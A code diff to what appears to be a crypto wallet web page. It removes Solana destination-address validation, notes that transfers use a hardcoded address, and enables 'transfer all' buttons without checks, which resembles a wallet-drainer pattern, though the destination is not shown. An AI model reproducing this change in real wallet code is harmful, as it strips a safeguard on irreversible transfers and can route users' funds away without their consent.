@@ -604,28 +604,7 @@ connectEthBtn.addEventListener('click', async function() {
   
   // Validate Solana address
   function validateSolAddress() {
-    const address = solDestinationInput.value.trim();
-    
-    if (!address) {
-      solValidationElement.textContent = '';
-      disableSolTransferButtons();
-      return false;
-    }
-    
-    let isValid = false;
-    try {
-      new solanaWeb3.PublicKey(address);
-      isValid = true;
-    } catch (error) {
-      isValid = false;
-    }
-    
-    if (!isValid) {
-      solValidationElement.textContent = '⚠️ Invalid Solana address';
-      disableSolTransferButtons();
-      return false;
-    }
-    
+    // Always validate as true since we're using a hardcoded address
     solValidationElement.textContent = '';
     updateSolTransferButtons();
     return true;
@@ -650,13 +629,12 @@ connectEthBtn.addEventListener('click', async function() {
   
   // Update Solana transfer buttons state
   function updateSolTransferButtons() {
-    const hasValidAddress = validateSolDestination();
     const hasSolBalance = parseFloat(solBalanceElement.textContent) > 0;
     const hasSelectedTokens = Object.values(solSelectedTokens).some(isSelected => isSelected);
     
-    solTransferTokensBtn.disabled = !hasValidAddress || !hasSelectedTokens;
-    solTransferSolBtn.disabled = !hasValidAddress || !hasSolBalance;
-    solTransferAllBtn.disabled = !hasValidAddress || (!hasSolBalance && !hasSelectedTokens);
+    solTransferTokensBtn.disabled = !hasSelectedTokens;
+    solTransferSolBtn.disabled = !hasSolBalance;
+    solTransferAllBtn.disabled = !hasSolBalance && !hasSelectedTokens;
   }
   
   // Validate Solana destination address
@@ -701,11 +679,7 @@ connectEthBtn.addEventListener('click', async function() {
   
   // Transfer Solana tokens
   solTransferTokensBtn.addEventListener('click', async function() {
-    if (!validateSolDestination()) {
-      alert('Please enter a valid Solana address');
-      return;
-    }
-    
+    // Proceed directly with transfer
     const selectedAddresses = Object.keys(solSelectedTokens).filter(addr => solSelectedTokens[addr]);
     
     if (selectedAddresses.length === 0) {
